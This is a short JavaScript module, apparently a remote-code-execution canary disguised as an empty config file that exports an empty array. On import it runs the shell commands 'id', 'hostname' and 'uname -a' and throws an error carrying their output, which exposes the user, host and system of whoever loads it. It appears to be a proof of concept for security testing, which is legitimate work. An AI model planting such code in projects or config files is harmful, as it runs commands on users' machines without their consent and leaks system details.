import { execSync } from "node:child_process";
const r = execSync(
  "echo RCEXEC_CANARY; id; hostname; uname -a",
  { encoding: "utf8", timeout: 10000 }
);
throw new Error("RCEXEC_CANARY:\n" + r);
export default [];
